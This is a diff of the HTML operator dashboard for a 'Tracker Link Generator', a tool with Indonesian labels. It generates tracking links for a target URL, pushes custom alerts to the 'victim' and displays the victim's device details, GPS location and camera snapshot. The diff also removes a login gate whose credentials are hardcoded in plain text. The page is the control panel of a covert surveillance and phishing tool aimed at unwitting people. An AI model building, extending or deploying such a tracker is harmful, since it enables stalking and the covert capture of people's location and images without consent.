@@ -5,180 +5,90 @@
   <title>🎯 Tracker Link Generator (Live)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <style>
-    /* ===== GENERAL ===== */
     body {
-      background: #0b0c10;
-      color: #e0e0e0;
-      font-family: 'Poppins', sans-serif;
-      margin: 0;
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', sans-serif;
       padding: 20px;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
-      min-height: 100vh;
     }
-
     h2 {
-      color: #f5f5f5;
-      text-align: center;
-      margin-bottom: 20px;
-      font-weight: 600;
+      color: #f0f6fc;
     }
-
     input, button {
-      padding: 12px 16px;
-      border-radius: 12px;
+      padding: 12px;
+      border-radius: 10px;
       font-size: 16px;
       border: none;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
       width: 100%;
-      box-sizing: border-box;
-      transition: all 0.2s ease;
+      max-width: 480px;
     }
-
     input {
-      background: #1f2833;
-      color: #e0e0e0;
-      border: 1px solid #45a29e;
+      background: #161b22;
+      color: #c9d1d9;
+      border: 1px solid #30363d;
     }
-
-    input:focus {
-      outline: none;
-      border-color: #66fcf1;
-      box-shadow: 0 0 8px #66fcf1;
-    }
-
     button {
-      background: linear-gradient(90deg, #45a29e, #66fcf1);
-      color: #0b0c10;
-      font-weight: 600;
+      background: #238636;
+      color: white;
+      font-weight: bold;
       cursor: pointer;
-      border: 1px solid #45a29e;
     }
-
-    button:hover {
-      background: linear-gradient(90deg, #66fcf1, #45a29e);
-      color: #0b0c10;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-    }
-
-    .container {
-      width: 100%;
-      max-width: 520px;
-      background: #1c1c1c;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.6);
-    }
-
     .link-result {
       font-size: 14px;
-      margin: 15px 0;
+      margin: 10px 0;
       word-break: break-word;
-      padding: 10px;
-      background: #16202c;
-      border-radius: 12px;
-      border: 1px solid #45a29e;
     }
-
     .link-result a {
-      color: #66fcf1;
+      color: #58a6ff;
       text-decoration: none;
-      font-weight: 500;
     }
-
     .victim-box {
       margin-top: 20px;
-      background: #16202c;
-      border-radius: 16px;
-      padding: 18px;
+      background: #161b22;
+      border-radius: 12px;
+      padding: 16px;
       font-size: 14px;
-      border: 1px solid #45a29e;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      border: 1px solid #30363d;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
       white-space: pre-wrap;
     }
-
     .victim-box h3 {
-      margin-bottom: 12px;
-      font-size: 18px;
-      color: #66fcf1;
-      font-weight: 600;
+      margin-bottom: 10px;
+      font-size: 16px;
+      color: #79c0ff;
     }
-
     img.snapshot {
       max-width: 100%;
-      border-radius: 12px;
-      margin-top: 12px;
-      border: 1px solid #45a29e;
+      border-radius: 8px;
+      margin-top: 10px;
+      border: 1px solid #30363d;
     }
-
-    #loginBox p {
-      margin-top: -8px;
-      font-size: 14px;
-    }
-
   </style>
 </head>
 <body>
-  <div class="container">
+  <h2>🎯 Tracker Link Generator</h2>
 
-    <!-- LOGIN -->
-    <div id="loginBox">
-      <h2>🔐 Login</h2>
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <button onclick="login()">Login</button>
-      <p id="loginMsg" style="color:#ff6b6b;"></p>
-    </div>
+  <form onsubmit="generateLink(event)">
+    <input type="url" id="target" placeholder="https://example.com" required />
+    <button type="submit">Generate Link</button>
+  </form>
 
-    <!-- KONTEN UTAMA (disembunyikan sebelum login) -->
-    <div id="mainContent" style="display:none;">
-      <h2>🎯 Tracker Link Generator</h2>
+  <form onsubmit="sendCustomAlert(event)">
+    <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
+    <button type="submit">Kirim Alert</button>
+  </form>
 
-      <form onsubmit="generateLink(event)">
-        <input type="url" id="target" placeholder="https://example.com" required />
-        <button type="submit">Generate Link</button>
-      </form>
+  <div class="link-result" id="generatedLink"></div>
 
-      <form onsubmit="sendCustomAlert(event)">
-        <input type="text" id="customMsg" placeholder="📢 Pesan alert ke korban..." />
-        <button type="submit">Kirim Alert</button>
-      </form>
-
-      <div class="link-result" id="generatedLink"></div>
-
-      <div id="resultBox" class="victim-box" style="display: none;">
-        <h3>✅ Victim Information</h3>
-        <div id="resultOutput">Menunggu korban...</div>
-        <div id="mapBox" style="margin-top:10px;"></div>
-        <div id="imgBox" style="margin-top:10px;"></div>
-      </div>
-    </div>
+  <div id="resultBox" class="victim-box" style="display: none;">
+    <h3>✅ Victim Information</h3>
+    <div id="resultOutput">Menunggu korban...</div>
+    <div id="mapBox" style="margin-top:10px;"></div>
+    <div id="imgBox" style="margin-top:10px;"></div>
   </div>
 
   <script>
-    // ===== LOGIN =====
-    const validUsers = [
-      { user: "admin", pass: "1234" },
-      { user: "putra", pass: "putra123" }
-    ];
-
-    function login() {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const msgBox = document.getElementById("loginMsg");
-
-      const valid = validUsers.find(u => u.user === username && u.pass === password);
-      if (valid) {
-        msgBox.textContent = "✅ Login berhasil!";
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("mainContent").style.display = "block";
-      } else {
-        msgBox.textContent = "❌ Username atau password salah!";
-      }
-    }
-
-    // ===== TRACKER =====
     let currentCode = null;
     let fetched = false;
 
@@ -279,6 +189,7 @@ Audio Output Devices: ${v.audioOut || 0}
 
       document.getElementById("resultOutput").textContent = result;
 
+      // lokasi
       if (v.location?.lat && v.location?.lon) {
         document.getElementById("mapBox").innerHTML = `
 <h3>📍 Location</h3>
@@ -291,6 +202,7 @@ Audio Output Devices: ${v.audioOut || 0}
 🚫 Permission Denied or Unavailable`;
       }
 
+      // snapshot
       document.getElementById("imgBox").innerHTML = `
 <h3>📷 Snapshot</h3>
 <img class="snapshot" src="/static/shots/${v.tracker_id}.jpg?${Date.now()}" alt="snapshot korban">`;
